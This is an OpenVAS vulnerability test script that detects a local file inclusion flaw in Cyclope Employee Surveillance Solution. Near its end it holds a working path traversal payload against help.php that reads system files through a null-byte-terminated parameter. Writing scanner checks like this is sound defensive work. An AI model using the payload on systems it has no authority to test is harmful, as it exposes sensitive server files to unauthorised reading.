###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cyclope_employee_surveillance_lfi_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain potentially
sensitive information.

Impact Level: Application";

tag_affected = "Cyclope Employee Surveillance Solution versions 6.0 to 6.0.2";

tag_insight = "An improper validation of user-supplied input via the 'pag'
parameter to 'help.php', that allows remote attackers to view files and execute
local scripts in the context of the webserver.";

tag_solution = "Update to version 6.2.1 or later,
For updates refer to http://www.cyclope-series.com";

tag_summary = "This host is running Cyclope Employee Surveillance Solution and
is prone to local file inclusion vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802934");
  script_version("$Revision: 9352 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-08-16 12:28:45 +0530 (Thu, 16 Aug 2012)");
  script_name("Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20545/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115590/cyclopees-sqllfi.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 7879);
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
sndReq = "";
rcvRes = "";
files = "";

## Get HTTP Port
port = get_http_port(default:7879);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get request
sndReq = http_get(item:"/activate.php", port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
   "Cyclope Employee Surveillance Solution" >< rcvRes)
{
  files = traversal_files();
  foreach file (keys(files))
  {
    ## Construct the request
    url = "/help.php?pag=../../../../../../" +  files[file] + "%00";

    if(http_vuln_check(port:port, url:url,pattern:file,
       extra_check:make_list("Cyclope Employee")))
    {
      security_message(port:port);
      exit(0);
    }
  }
}
